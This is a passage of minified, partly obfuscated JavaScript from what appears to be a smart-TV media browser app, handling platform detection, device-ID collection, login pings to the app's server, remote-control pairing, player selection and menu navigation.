if(ua.match(/skyworth/i))p="skyworth";else if(ua.match(/iphone|ipad/i))p="iphone";else if(ua.match(/vestel/i))p="vestel";else if(ua.match(/viera/))p="pa";else if(ua.match(/toshiba/))p="ts";else if(ua.match(/polaroid|sharp|sraf/i)){p="sharp"}else if(ua.match(/ucbrowser/))p="uc";else if(ua.match(/netrange/))p="netrange";else if(ua.match(/hbbtv/))p="hbbtv";else if(ua.match(/tcl/))p="tcl";else if(ua.match(/opera tv/))p="operatv";else if(ua.match(/nettv/))p="nettv";else if(ua.match(/qtembedded;/))p="qtembedded";else if(ua.match(/tizen/))p="webtizen";else if(ua.match(/pixel/))p="pixel";else if(ua.match(/sbertv/))p="sbertv";else if(ua.match(/smart tv|tvbrowser/))p="tvbrowser";else if(ua.match(/(smart-tv|maple|navi|lg|tv store)/)){p="yes"+ua.match(/(smart-tv|maple|navi|lg|tv store)/)[1].replace("-","_")}else if(window.tFlp)p="v_"+tFlp;else{p="no"}
if(document.location.href.indexOf("idemag")>0)p="mag";if(ua.match(/firefox\/2\.5/)){c.box_low=1;c.showfon=!1}
if(window.glg_uid){p="lg";c.lg_uid=glg_uid}
c.loader_platform=window.loader_platform||"";if(c.loader_platform=="lg_webos"){c.app_cors=!0;p="lgw"}else if(c.loader_platform=="lg_netcast"){c.app_cors=!0;p="lg"}
c._platform=p;if(p=="tizen"){c.app_cors_referer=0;if(!window.webapis)l1OO1III0XvIvOlII1lYpr("$WEBAPIS/webapis/webapis.js")}
if(!p.match(/maple|tizen|mag|dune|android-device/))c.hashR=!0;if(window.box_low)c.box_low=1;return p},screen:function(){var c=this;if(c.platform()=="maple"){c.innerW=1280;c.innerH=720}else{c.innerW=window.innerWidth
c.innerH=window.innerHeight}
return{w:c.innerW,h:c.innerH}},generateId:function(){var c=this;var pref={"polaroid":"pd","finlux":"fn","telefunken":"tf","digihome":"dg","tizen":"st","smart-tv":"sa","toshiba":"ts","hisense":"hc","vestel":"et","android":"ad","skyworth":"sk","viera":"pa","lg":"lg","philips":"ph","sony":"sn","tcl":"tc"};var bid="pc";for(var i in pref)if(ua.indexOf(i)!=-1&&bid=="pc")bid=pref[i];var m=ua.match(/\(.*?\)/g);if(m){for(var i in m){var d=m[i].match(/([\d]+)/g);if(d)bid+=d.join("")}}
c.BID=bid.substr(0,6);if(c.ipG){var t=c.BID+ip2long(c.ipG).toString().split("").reverse().join("")+ip2long(c.ipG);t=t.substr(0,12);c.popUp("First run generate unique ID<br>"+t);return t}},rand:function(min,max){if(min==null)min=100000;if(max==null)max=990000;return Math.floor(Math.random()*(max-min+1)+min)},remoteData:{get:function(u,cc){var c=maJor,t=this;var key=c.getXY().split("|")[0].split("=")[1]||c.rand();uHelper.create("directnoheader").getI(u||"http://cloudflare.appfxml.com/browseraccount/?do=fimport&v=auto&rev=4").parse=function(s){s=mB64.decrypt(gV(s),key);if(t.oncomplete)t.oncomplete(s);else{if(cc.canceled){return}
var x=s.split("[-..-]");if(x.length<3){kjtYpr.inf("Error format import file!",2500);is_loadpage(-1)}else{c.autoimpok=2;var g='';for(var i=0;i<x.length&&i<c.allfs.length;i++){if(c.allfs[i]=="storage")continue;if(c.allfs[i]=="settings"){var xx=l0OIIlIIlONuu1111Ypr(x[i]);if(xx!=null){xx.ts=0;xx.name=c.params.get("name");x[i]=ll1lI1lI0sl0OlIYpr(xx)}}
c.write(c.allfs[i],x[i]);statusbar("write "+c.allfs[i]+" ("+x[i].length+"byte)","link")}
statusbar("Иморт завершен","link");c.popUp("Перезагрузите приложение!");c.params.set("ts",0);if(c.platform()!="mag"){document.location.reload();location.reload()}}}}
return t}},appIDInit:function(){var c=this;if(c.platform()=="maple"){c.hardware=($_("pluginTV")&&$_("pluginTV").GetProductCode(1));c.ID=$_("pluginNetwork")&&$_("pluginNetwork").GetMAC&&$_("pluginNetwork").GetMAC(1);if(window.webapis&&webapis.tv)c.IDS=webapis.tv.info.getDeviceID();c.series=(c.hardware.replace("BD-","").indexOf("D")!=-1||c.hardware.indexOf("BD-E5")!=-1)?"D":c.series;c.series=(c.hardware.indexOf("C")!=-1)?"C":c.series;c.series=(c.hardware.indexOf("E")!=-1)?"E":c.series;c.api="samsapi";widgetAPI.sendReadyEvent();c.pluginAPI.unregistKey(tvKey.KEY_VOL_UP);c.pluginAPI.unregistKey(tvKey.KEY_VOL_DOWN);c.pluginAPI.unregistKey(tvKey.KEY_MUTE);$_('pluginObjectNNavi')&&$_('pluginObjectNNavi').SetBannerState&&$_('pluginObjectNNavi').SetBannerState(2);window.onShow=function(){c.pluginAPI.setOffScreenSaver();c.pluginAPI.setOffIdleEvent();c.pluginAPI.unregistKey(tvKey.KEY_VOL_UP);c.pluginAPI.unregistKey(tvKey.KEY_VOL_DOWN);c.pluginAPI.unregistKey(tvKey.KEY_MUTE);c.pluginAPI.registKey(tvKey.KEY_GUIDE);c.pluginAPI.registKey(tvKey.KEY_SOURCE);c.pluginAPI.unregistKey(203);c.pluginAPI.unregistKey(204);c.pluginAPI.registKey(613);c.pluginAPI.registKey(105);c.pluginAPI.registKey(106);c.pluginAPI.registKey(309);c.pluginAPI.registKey(612);c.pluginAPI.registKey(1118);c.pluginAPI.registKey(1219);c.pluginAPI.registKey(84);c.pluginAPI.registKey(655);c.pluginAPI.registKey(1089);c.pluginAPI.registKey(1057);c.pluginAPI.registKey(1083);c.pluginAPI.registKey(1078);c.pluginAPI.registKey(1080);c.pluginAPI.registKey(1086);c.pluginAPI.registKey(78);c.pluginAPI.registKey(1249)}}else if(c.platform()=="tizen"){if(webapis&&webapis.network&&webapis.network.getMac){c.ID=webapis.network.getMac();c.api="tizenapi"}else if(window.cpmac){c.api="tizencut";c.ID=cpmac;c.hardware=cphardware;c.IDS=cpserial}
if(webapis&&webapis.productinfo&&webapis.productinfo.getModel){c.hardware=webapis.productinfo.getModel();if(webapis.productinfo.getDuid)c.IDS=webapis.productinfo.getDuid()}
if(tizen.tvinputdevice&&tizen.tvinputdevice.registerKey){var tk=["0","1","2","3","4","5","6","7","8","9","ColorF0Red","ColorF1Green","ColorF2Yellow","ColorF3Blue","MediaPlay","MediaStop","MediaPause","MediaRewind","MediaFastForward","MediaRecord","MediaPlayPause","ChannelList","ChannelUp","ChannelDown","PreviousChannel","Info"];for(var i in tk)tizen.tvinputdevice.registerKey(tk[i]);}}else if(c.platform()=="dune"){stb=$_("dune-api");stb.init();stb.setColorKey(1);c.ID=stb.getSerialNumber();c.ID=c.ID.toString().replace(/-/g,"").replace(/0000/g,"");c.hardware=stb.getProductId()+"-"+stb.getApiVersion();c.api="duneapi"}else if(c.platform()=="mag"){stb=gSTB;if(window.innerHeight<576)c.resolution_prefix=576;stb.EnableServiceButton(!0);stb.InitPlayer();c.resolution_portal=document.referrer||"file:///home/web/services.html";c.ID=stb.GetDeviceMacAddress();c.IDS=stb.GetDeviceSerialNumber();c.hardware=stb.GetDeviceModel();c.api="magapi";window.moveTo(0,0);stb.SetVolume(80)}else if(c.platform()=="spark"){c.ID=__spark_stbid__;c.hardware=__model__+"/"+__appVersion__;c.api="sparkapi"}else if(c.platform()=="android-device"){var s=andr.cmd("initial")||"|||||||";c.signature=s;c.hardware=s.split("|")[2];c.build=s.split("|")[4];c.sdk=s.split("|")[1];c.api="androidapi";c.ID=s.split("|")[7];if(c.ID.length<15)c.ID=""}else if($_("device")&&$_("device").net_macAddress){c.ID=$_("device").net_macAddress;c.hardware=$_("device").modelName;c.api="lgapi"}else if(c.platform()=="sony"){var t=navigator.userAgent.match(/Model\/([\S]+)/);c.hardware=t&&t[1]||"sony"}else if(window.lg_uid){c.ID=lg_uid;c.api="lgusb"}
if(window.lg_model)c.hardware=lg_model+"_webOS";if(c.hardware&&ua.match(/webappmanager/)&&c.hardware.match(/LF|UF/))c._platform="lgw2";if(document.location.href.indexOf("operatv.obovse.ru")>0)c.api="operatv"+c.api;if(!c.ID)c.virtual=1;for(var i=10;i<=oInset.l1lIIOlllvBXuv1l1IYpr;i++)c.allfs.push("url"+i);if(c.params.get("ts")){c.statusbar("_FPZagruzka_ _FPdata from server_...");c.remoteData.get().oncomplete=function(s){c.autoimpok=1;var x=s.split("[-..-]");if(x.length<3)c.popUp("<font color=red>_FPError download data, load local settings_!</font>",1500);else{var g=0;for(var i=0;i<x.length&&i<c.allfs.length;i++){c.write(c.allfs[i],x[i]);g+=x[i].length}
c.loadinfo("_FPSize data_ "+g+" _FPBait_!");c.autoimpok=2}
c.appSetInit()}}else c.appSetInit()},getId:function(){var c=this;c.ID=c.ID||c.params.get("ID");if(!c.savedId){if(!c.ID||c.ID.length<12||c.ID.match(/(undefined|file not|file...not|020000000000|112233445566|000000000000)/))
c.ID=c.generateId();if(c.ID){c.ID=c.ID.replace(/:|-| /g,"").toLowerCase().substr(0,12);if(c.ID!=c.params.get("ID")){c.params.set("ID",c.ID);if(c.IDS)c.params.set("IDS",c.IDS)}
c.savedId=1}}
return c.ID||""},inf:function(text,delay,color){var c=this;text=gV(text).replace(/'/g,"").replace(/\r/g,"").split('\n');clearTimeout(c.inftimer);if(text){var t=$_("textinfo").innerHTML;if(t)t+="<br>";text=t+"<span style='color:"+(color||"white")+";background-color:black;'>"+text+"</span>";$_("textinfo").style.zIndex="1";c.inftimer=setTimeout(function(){$_("textinfo","");$_("textinfo").style.zIndex="0"},(delay||800))}
$_("textinfo",text)},addident:function(u,m){var c=this;var ident="box_client=lg&box_mac="+(c.getId()||"&box_dev="+c.BID)+"&initial="+c.box_client+"|"+c.getId()+"|"+encodeURIComponent(gV(c,"hardware"))+"|"+gV(c,"IDS")+"|"+c.getXY()+"|"+encodeURIComponent(c.params.get("name"))+"&platform="+c.platform()+"&country="+c.ipCountry+"&tvp="+c.timestamp+"&hw="+c.countHw;if(c.app_cors||(c.params.get("remote")>=2&&c.params.get("remoteactive"))){var type="";if(c.app_cors){if(c.series=="D"||c.series=="C")type="sams_d";else type=c.platform()}else if(c.params.get("remoteip").indexOf(":8027")>0)type="curl_windows";else if(c.params.get("remoteip").indexOf(":8028")>0)type="curl_androind";ident+="&cors="+type}
if(c.user)ident+="&box_user="+encodeURIComponent(gV(c.user,"email"));if(c.macv)ident+="&mv="+c.macv;if(c.oID)ident+="&oID="+c.oID;if(!u)return"&"+ident.replace(/ /g,"%20");var post=gV(u.match(/(#POST.*$)/),1);u=u.split("#")[0];if(u.match(/^https?:\/\//)){var dm=u.match(rCook);if(dm!=null){dm=dm[3]}else dm="localhost";c.llIO1lQ1SXSlO111Ypr=c.llIO1lQ1SXSlO111Ypr||l0OIIlIIlONuu1111Ypr(c.read("storage"))||{};if(dm=="cloudflare.appfxml.com"&&!c.llIO1lQ1SXSlO111Ypr[dm]&&c.llIO1lQ1SXSlO111Ypr["cloudflare.appinfo.su"])c.llIO1lQ1SXSlO111Ypr[dm]=c.llIO1lQ1SXSlO111Ypr["cloudflare.appinfo.su"];if(c.params.get("vk_id")!=""&&dm=="vk.com"&&!c.llIO1lQ1SXSlO111Ypr[dm]){c.llIO1lQ1SXSlO111Ypr[dm]={};c.llIO1lQ1SXSlO111Ypr[dm].vk_id=c.params.get("vk_id");c.llIO1lQ1SXSlO111Ypr[dm].vk_token=c.params.get("vk_token")}
if(c.llIO1lQ1SXSlO111Ypr[dm]){for(var i in c.llIO1lQ1SXSlO111Ypr[dm])ident+="&cookie["+i+"]="+encodeURIComponent(c.llIO1lQ1SXSlO111Ypr[dm][i]);}}
if(u.indexOf("initial=")>0&&u.indexOf("box_mac")>0)return u+post;if(u.indexOf("?")>0)u+="&";else u+="?";ident=ident.replace(/ /g,"%20");u+=ident;if(m)u=u.replace(/\|/g,"-.-");return u+post},updateLogin:function(m){var c=this;if(!m)setTimeout(function(){if(c.countHw==-1)c.updateLogin()},50000);var url=c.addident("http://cloudflare.appfxml.com/browseraccount/?do=ping&mtype="+c.api+"-"+c.virtual+"&uadns="+c.uadns+"&loader_platform="+c.loader_platform+"&hm="+c.hm);if(c.platform()=="android-device")url+="&signature="+c.signature+"&build="+c.build;uHelper.create().addh({"Referer":"http://forkbeta.tv/device_"+c.hardware+"_"+c.platform()+"_"+c.getId()}).get(url).parse=function(s){if(s){c.updateLoginData(s);c.write("lastdata",s)}else c.countHw=-1}},updateLoginData:function(s){var c=this;var t=(s||"3|MTNONEc2ODc5NAR||||||||").split("|");if(t.length>9){c.countHw=t[0]||1.6;c.mt=t[1];c.ipG=t[2]||c.ipG;c.ipCountry=t[3];c.ipC=t[4];c.dateto=t[5];c.timestamp=t[7]||0;if(t[8].indexOf("/device")>0)c.xhr_referer=3;else if(t[8])c.xhr_referer=1;else c.xhr_referer=0;if(t[9]){c.user={"login":t[9],"email":t[10],"md5":t[11]};uHelper.updateDef()}else c.user=null;if(gV(t,12)=="info")confirmed.create(t[13],"Profile");if(c.user){if(c.timestamp<3)
var but='<div id="butacc" style="position:absolute;border-left: 7px solid transparent; border-right: 7px solid transparent;border-bottom: 12px solid #ffc107;	margin: -14px 0px 0px -13px; overflow: hidden;text-align: center;"></div><span style="position: absolute; font-size: 11px; margin-top: -11px;margin-left: -8px;">i</span>';else but='<div id="butacc" style="position:absolute;position: absolute; width: 13px; height:13px; margin: -14px 0px 0px -13px;      background-color: #009688;font-size: 11px;overflow: hidden;text-align: center;border-radius: 5px;">'+c.user.email.substr(0,1)+'</div>'}else but='<div id="butacc" style="position:absolute;position: absolute; width: 13px; height: 13px; margin: -14px 0px 0px -13px; background-color: #b5bdc3; font-size: 11px;overflow: hidden;text-align: center;border-radius: 5px;">x</div>';$_('bt6',but)}},getXY:function(){var c=this;if(c.mt&&c.ipG&&librarys.exis("md5"))return c.mt+"|"+md5("fork"+c.ID+c.ID+c.IDS+c.virtual+c.api+ipG+"player").substr(2,15).toUpperCase()+"|"+c.api+"|"+c.virtual;else return""},each:function($obj,callback){for(var i in $obj)
if(callback($obj[i],i)===!1)break},updateWeather:function(){var c=this;clearTimeout(c.uWt);c.uWt=setTimeout("maJor.updateWeather();",2000000);if(c.params.get("weather")==-1){$_("weather").style.display="none";return}
uHelper.create("directnoheader").hid().getI("http://cloudflare.appfxml.com/browseraccount/?do=weather&box_low="+c.box_low+"&id="+maJor.params.get("weather")).parse=function(s){$_("weather").style.display="block";$_("weather",s)}},sPlayer:{"tizen":"Tizen _FPpleer_","download":"_FPVstroenniy_ _FPpleer_","manual":"System media player...","vimu":"Vimu player","ifrhtml5":"Iframe HTML5 _FPpleer_","html5":"HTML5 _FPpleer_","media":"_FPMedia_ _FPpleer_","ext":"_FPVneshniy_ _FPpleer_","exthtml5":"_FPVneshniy_ HTML5 _FPpleer_","extmedia":"_FPVneshniy_ _FPMedia_ _FPpleer_","jw":"JW Player 8.20.1"},sIconPlayer:{"tizen":"tizen.png","download":"vstrpleer.png","manual":"media.png","vimu":"media.png","ifrhtml5":"ifrhtml5.png","html5":"html5.png","media":"media.png","ext":"","exthtml5":"","extmedia":"","jw":"jw.png"},getPlayer:function(){var c=this;if(c.platform()=="android-device"&&c.build>=5.2){c.sPlayer.media="MX Player";var exPl=["html5","jw","manual","media","vimu"];var exPlV=["jw","html5","manual","media","vimu"];var exAll=exPl}else{exAll=["html5","jw","media","ifrhtml5","download"];if(c.platform()=="tizen"){exPl=["html5","jw","tizen"];exPlV=["jw","html5","tizen"];exAll=["html5","jw","tizen","ifrhtml5","download"]}else if((c.platform()=="maple"&&c.box_low)||c.platform().match(/dune|mag/)){exPl=["media"];exPlV=["media"]}else if(c.platform().match(/webtizen|iphone|sony|webos|uc/)){exPl=["html5","jw","ifrhtml5"];exPlV=["jw","html5","ifrhtml5"]}else if(c.box_low){exPl=["media","html5","ifrhtml5"];exPlV=["media","html5","ifrhtml5"]}else{exPl=["html5","jw","media","ifrhtml5"];exPlV=["jw","html5","media","ifrhtml5"]}}
if(!window.jwplayer){exPl=arrDelValue(exPl,"jw");exPlV=arrDelValue(exPlV,"jw")}
var x={all:{},v:{},s:{},player:{title:c.sPlayer[maJor.params.get('player')],name:maJor.params.get('player'),icon:c.sIconPlayer[maJor.params.get('player')]},streamplayer:{title:c.sPlayer[maJor.params.get('streamplayer')],name:maJor.params.get('streamplayer'),icon:c.sIconPlayer[maJor.params.get('streamplayer')]}};for(var i in exPl)x.v[exPl[i]]={title:(c.sPlayer[exPl[i]]||i),icon:(c.sIconPlayer[exPl[i]]||i),name:exPl[i]};for(var i in exPlV)x.s[exPlV[i]]={title:(c.sPlayer[exPlV[i]]||i),icon:(c.sIconPlayer[exPlV[i]]||i),name:exPlV[i]};for(var i in exAll)x.all[exAll[i]]={title:(c.sPlayer[exAll[i]]||i),icon:(c.sIconPlayer[exAll[i]]||i),name:exAll[i]};return x},appSetInit:function(){var c=this;c.hm=c.params.get("hm");if(c.hm.indexOf(c.ID)==-1){c.hm+=c.ID+";";c.params.set("hm",c.hm)}
confirmed.close();handler="menu";c.updateLoginData(c.read("lastdata"));c.updateLogin();if($_("video"))$_("video").style.zIndex="0";if(c.platform()=="android-device"&&c.build<5.1)c.inf("Доступна новая версия приложения!",1800);setInterval(function(){c.nupd++;if(c.timestamp<3&&c.nupd%2==1)return;if(c.user&&handler!="player")autoexport("user");if(c.params.get("ts"))autoexport("timer")},180000);c.params.set("buffer",2);if($_("startlogo"))$_("startlogo").style.display="none";c.l0lOIIIW0lDI1I0lYpr="about:blank";c.statusbar("_FPOzhidanie_ _FPmenu_..");c.lOO1IIlwlIl0l1lYpr=c.params.get("history");oInset.init();c.updateWeather();vPlayer.audio.showPlayer("autostart");if(!c.app_cors)uHelper.create("directnoheader").hid().get("http://staticdata.appinfo.su/staticfiles/cors.html").parse=function(s){if(s){c.app_cors=1;c.app_cors_referer=0}};$_("main").focus()},loadinfo:function(s){statusbar(s)},Remote:{init:function(){var c=maJor;this.remote=c.params.get('remote');this.remoteip=c.params.get('remoteip');if(this.remote==2){if(this.remoteip)this.ping(!0);else this.getip()}
if(this.remote==3){if(this.remoteip)this.ping();else kjtYpr.inf("IP:PORT для RemoteFork не установлен в Настройках приложения! Установите эти данные, или выставьте значение _FPauto_",2500)}},getip:function(){var c=maJor;var url="http://getlist2.obovse.ru/remote/index.php";uHelper.create("directnoheader").hid().get(url+"?do=active&initial="+c.getId()+"|"+c.platform()+"|"+c.params.get("name")).parse=function(s){if(s){var gp=s.split("|")[0];if(s.split("|")[0].indexOf(":80")>0&&gp.length>9){if(c.params.get('remoteip')!=gp){c.params.set("remoteip",gp);c.Remote.ping()}}else{c.statusbar("Error format respone from RemoteFork "+s);c.params.set("remoteactive",0);$_("remotesrc").src=_img("_ST_remoteOffline.png")}}}},ping:function(init){var c=maJor;c.acestream=0;var url="http://"+c.params.get('remoteip')+"/test?"+c.getId()+"|"+c.platform()+"|"+c.params.get("name");uHelper.create("directnoheader").hid().get(url.replace(":80/","/")).parse=function(s){s=s||"";if(s.indexOf("Ace Stream")>0)c.acestream=1;if(s.indexOf("Work")>0){if(s.indexOf("Android")>0||c.params.get("remoteip").indexOf(":8028")>0)$_("remotesrc").src=_img("_ST_st_andr.png");else $_("remotesrc").src=_img("_ST_remoteOnline.png");$_("remotesrc").width=24;c.params.set("remoteactive",1);if(s.indexOf("Visual Studio")>0||s.indexOf("RemoteFork Server")>0){c.remote_version=1.2}else c.remote_version=1.1;var mc=s.match(/v\. (\d+\.\d+)\./);if(mc){if(mc[1]>=1.40){doprf1="/hlsproxy";doprf2="/acestream"}}
mc=s.match(/v\. (.*?)</);if(mc)c.rf_ver=mc[1]}else{c.rf_ver=c.remote_version=0;$_("remotesrc").src=_img("_ST_remoteOffline.png");c.params.set("remoteactive",0);if(init)c.Remote.getip()}}
this.plugping()},plugping:function(){var c=maJor;$_("remote").style.width="56px";$_("acesrc").style.display="none";c.params.set("aceactive",0);if(getip("acestream")){uHelper.create("directnoheader").hid().get("http://"+getip("acestream")+"/webui/api/service?method=get_version&format=jsonp&callback=mycallback").parse=function(s){if(gV(s).indexOf("mycallback")!=-1){c.params.set("aceactive",1);$_("acesrc").style.display="block";$_("acesrc").src=_img("_ST_acesrc.png")}}}
c.params.set("torrserveactive",0);if(getip("torrserve")){uHelper.create("directnoheader").hid().get("http://"+getip("torrserve")+"/echo").parse=function(s){if(gV(s).indexOf(".")>0){c.torver=s;if(c.torver.indexOf("MatriX")>=0)c.torver=1.2;c.params.set("torrserveactive",1);$_("acesrc").style.display="block";$_("acesrc").src=_img("_ST_torrserve.png");c.statusbar("Torrserve active! Version: "+s,"text")}}}}},start:function(){var c=this;window._img=c._img;window.showinform=c.inf;if(!c.init_style)c.appStyles();if($_("pr")&&librarys.exis("json")&&librarys.exis("js")&&(c.body=document.getElementsByTagName('body')[0])){c.enteresObj=l0OIIlIIlONuu1111Ypr(c.read("enteres"))||{};c.userTop=l0OIIlIIlONuu1111Ypr(maJor.read("datas"))||{};c.ftimes=l0OIIlIIlONuu1111Ypr(maJor.read("times"))||{};if(c.platform()=="no")c.statusbar("Loading error. PC web browsers are not supported!");else{c.loadinfo("Load js...");c.statusbar("_FPINFO_: _FPForResetAppPressButton_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_ or TOOLS");if(c.platform()=="maple")c.statusbar("_FPINFO_: _FPForResetAppPressButton_ TOOLS");else c.statusbar("_FPINFO_: _FPFor reset app press button_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_");c.appDivBody();c.appIDInit();c.Remote.init();fEpg.init()}}else setTimeout(function(){c.start()},50);return c}};maJor.start();var Inset={create:function(){var c=Object.create(this);c.id=oInset.tabs.length;c.history=[];c.title="_FPDobroPozhalovat_";c.icon="";c.fwhistory=[];c.isLoading=0;c.select=0;c.lastselect=null;c.lII1I1PVBuI1lIlYpr="about:blank";c.loadPage=null;c.oldtvg=0;c.oldselpos98=-2;c.INC=-1;c.is_private=0;c.oldselpos=-2;return c},init:function(n){this.id=oInset.tabs.length;if(n!=null)var s=maJor.read("url"+n);this.loadHist(s)},curCh:function(m,v){var c=this;if(m==null){if(c.page==null)return{};else{var ch=c.page.channels[c.select]||{};ch.index=ch.index||c.select;return ch}}else{if(typeof c.curCh()=="undefined")return"";else{if(v==null)return gV(c.curCh(),m);else{c.curCh()[m]=v;return!0}}}},is_ifr:function(ch){var c=this;if(c.page==null)return 0;if(c.page.IFRAMES.length==0)return 0;if(ch==null)ch=c.curCh();if(gV(ch,"iframe")=="")return 0;else return 1},mark:function(id,m,el){var c=this;if($_("ch"+id)==null){return}
$_("ch"+id).sel=m;var curPage=c.page;if(m){$_("ch"+id).className=$_("ch"+id).className.replace(/default/g,"selected");if(c.page.getTypePos(c.curCh(),c.select)=="list"){if(c.select>=0)rollTitle()}
var desc=gV(c.curCh("description"));var ch=c.curCh();var bhtml="";if(typeof ch.green=="object"){bhtml+='<span onclick=\'keyHandler({"keycode":VK_GREEN});\'><div style="display: inline-block;border-radius:2px;padding: 6px; background: green;margin: 0px 3px;"></div> '+ch.green.title+"</span>";$_("bt5").style.display="none"}else $_("bt5").style.display="block";if(gV(ch,"yellow_url")!=""){if(gV(ch,"yellow_title")=="")ch.yellow_title=ch.yellow_url;ch.yellow={"title":ch.yellow_title,"playlist_url":ch.yellow_url}}
if(typeof ch.yellow=="object"){bhtml+='<span onclick=\'keyHandler({"keycode":VK_YELLOW});\'><div style="display: inline-block;border-radius:2px;padding: 6px; background: yellow;margin: 0px 1px 0px 4px;"></div> '+ch.yellow.title+"</span>";$_("bt6").style.display="none"}else $_("bt6").style.display="block";if(bhtml!=""){$_("bbot").style.display="block";$_("bbot","<div style='float:right;background:#3f4b50;padding:4px 6px;'>"+bhtml+"</div>")}else $_("bbot").style.display="none";if(desc!=""&&c.select>=0&&gV(ch,"template").indexOf("$description")==-1){$_("description").style.display="block";$_("description",desc);if(c.page.getTypePos(c.curCh(),c.select)=="list"){var i=c.select;while(i>=0&&c.page.getTypePos(curPage.channels[i],i)=="list"){i--}
i++}else{var i=c.select;while(i<curPage.channels.length&&c.page.getTypePos(curPage.channels[i],i)!="list")i++}
if(gV(gP().global,"startcontent")){if(i<gP().global.startcontent)i=gP().global.startcontent}
if(i>=0&&i<curPage.channels.length){var top_l=buff.scrollsitetop();var ch_pos=$_("ch"+i).offsetTop-top_l;if(ch_pos<=0)ch_pos=0;else if(ch_pos>$_("scrollsite").offsetHeight)ch_pos=$_("scrollsite").offsetHeight;ch_pos=Math.ceil(ch_pos);$_("description").style.top=(ch_pos)+"px";$_("description").style.maxHeight=($_("scrollsite").offsetHeight-ch_pos)+"px"}}else{$_("description").style.display="none";$_("description","")}
if(gP("is_iptv")>2){fEpg.l001Q1O0II0CO01lYpr_last=0;fEpg.getfull()}
if(c.select>=0&&(vPlayer.is_mini()||maJor.params.get("pip")==2||(maJor.params.get("pip")==1&&gP("is_iptv")>2))){vPlayer.stream.setPip(c.curCh())}}else{$_("ch"+id).className=$_("ch"+id).className.replace(/selected/g,"default")}},wheel:function(event){var c=this;var curPage=c.page;var delta;event=event||window.event;if(event.wheelDelta){delta=event.wheelDelta/120;if(window.opera)delta=-delta}else if(event.detail){delta=-event.detail/3}
if(handler=='menu'){var s=c.select-3*delta;if(s<0)IlO11lQ0().focused(0);else if(s>=curPage.channels.length)c.focused(curPage.channels.length-1);else{if(c.select>=0&&c.page.getTypePos(c.curCh(),c.select)=="list")c.focused(s);else if(delta<0)keyHandler({"keycode":VK_DOWN,"isTrusted":!0});else keyHandler({"keycode":VK_UP,"isTrusted":!0})}
if(event.preventDefault)event.preventDefault();event.returnValue=!1}},hint:function(){var c=this;var link="",dop="";if($_("statbar2").style.display!="none"&&gV($_("statbar2"),"mode")=="link")return;if(gV($_("statbar2"),"mode")=="hint")$_("statbar2").style.display="none";if(c.select>=0){dop=(getSelect()+1)+"/"+c.page.channels.length+" ";var x=curCh().rates;if(x&&x[2]){if(x[2]>80)var cc="#229900";else if(x[2]>50)cc="#446600";else if(x[2]>30)cc="#e79010";else cc="#ec4b3f";dop+="<span style='color:"+cc+";'>[rate: "+x[2]+"%,"+(x[0]+x[1])+"]</span> "}
var link=c.curCh("playlist_url")+c.curCh("stream_url");if(c.curCh("search_on")!="")link=c.curCh("search_on");if(link=="submenu")link="[]";if(link=="md5hash")link=c.curCh("parser");if(c.curCh("sourceurl")!=""){c.ifrurl=1;$_("navurl",getInfoUrl(c.curCh("sourceurl")))}else if(c.ifrurl){c.ifrurl=0;$_("navurl",getInfoUrl(c.page.lII1I1PVBuI1lIlYpr))}}else if(c.select==-1){if(insetSelect<insetCount)link=oInset.tabs[insetSelect].get("url");else if(insetSelect==insetCount)link="new tab";else link=oInset.allI()[insetSelect]}
if(link!="")statusbar(dop+link,"hint")},focused:function(n,el){var c=this;stopRoll();runtime=Date.now();clearTimeout(timerScroll);if(n!=null)c.select=n;if(isNaN(c.select))c.select=0;if(c.page==null)return;if(c.select>=c.page.channels.length)c.select=c.page.channels.length-1;if(c.select>0)var cnt=0;else cnt=c.select;if(c.select!=-1)insetSelect=insetActive;var hsh=cnt+" "+menuSel+" "+menuSubSel+" "+sdbarSel+" "+insetSelect+" "+insetActive+" "+c.getTitle();if(sdbar!=null)hsh+=" "+sdbar.length;if(c.page!=null&&(c.page.is_mark||c.page.marked)){if(!c.page.is_mark){c.page.is_mark_array={};c.page.marked=0}
for(var i=0;i<c.page.channels.length;i++){if(c.page.is_mark_array[i]){c.page.marked=1;$_("titleid"+i).style.color="#b40c00";$_("titleid"+i).style.fontWeight="bold";$_("titleid"+i).style.border="1px solid red"}else{$_("titleid"+i).style.color="";$_("titleid"+i).style.fontWeight="";$_("titleid"+i).style.border=""}}}
if(c.lastResel!=hsh){oInset.renderInset();menu_sel();c.page.l11l0IfeO110IOYpr();sidebar_sel();oInset.omniSel();c.lastResel=hsh}
if(c.lastselect!=c.select&&c.lastselect!=null&&$_("ch"+c.lastselect)!=null)c.mark(c.lastselect,0);if(c.select>=0){c.page.renderChannels(c.select,"focused");c.mark(c.select,1,el);if(!el){mcanc=0;var cs=c.select;if($_("ch"+cs)){var ch_pos=buff.chtop(cs)-buff.scrollsitetop();var site_bot=$_("scrollsite").offsetHeight;var y_t=Math.ceil($_("ch"+cs).offsetTop-site_bot*0.18);var y_b=Math.ceil($_("ch"+cs).offsetTop+$_("ch"+cs).offsetHeight-site_bot*0.87);progScroll=1;if($_("ch"+cs).offsetTop<$_("scrollsite").offsetHeight*0.5||cs<1)buff.scrollsitetop(0);else if(c.lastselect>=0&&c.lastselect<c.page.channels.length&&(c.select-c.lastselect==-10||c.select-c.lastselect==10)){var ch_lastpos=$_("ch"+c.lastselect).offsetTop-buff.scrollsitetop();buff.scrollsitetop(buff.scrollsitetop()+ch_pos-ch_lastpos)}else if(y_t<buff.scrollsitetop()){buff.scrollsitetop(y_t)}else if(y_b>buff.scrollsitetop())buff.scrollsitetop(y_b);if(n)gP().renderIcons(n)}}
runtime=Date.now()-runtime}
c.lastselect=c.select;c.hint()},sPosMaxY:function(){var c=this;var y=0;for(var i in c.page.sPos)if(c.page.sPos[i][1]>y)y=c.page.sPos[i][1];return y},sPosGetMaxXbyRow:function(r){var c=this;var y=0;for(var i in c.page.sPos)if(c.page.sPos[i][0]>y&&c.page.sPos[i][1]==r)y=c.page.sPos[i][0];return y},sPosGetXbyRow:function(px,py){var c=this;var max=c.sPosGetMaxXbyRow(py);if(px>max)px=Math.ceil((px/startX)*max);var tmp=px;for(var i in c.page.sPos){if(c.page.sPos[i][0]==px&&c.page.sPos[i][1]==py)return i;else if(c.page.sPos[i][1]==py)tmp=i-1}
return tmp+1},posStart:function(x,y){var c=this;oldselect=c.select;if(typeof c.page=="undefined")var count=0;else{count=c.page.channels.length;if(c.INC!=-1){if(c.INC<c.page.inc){return}}}
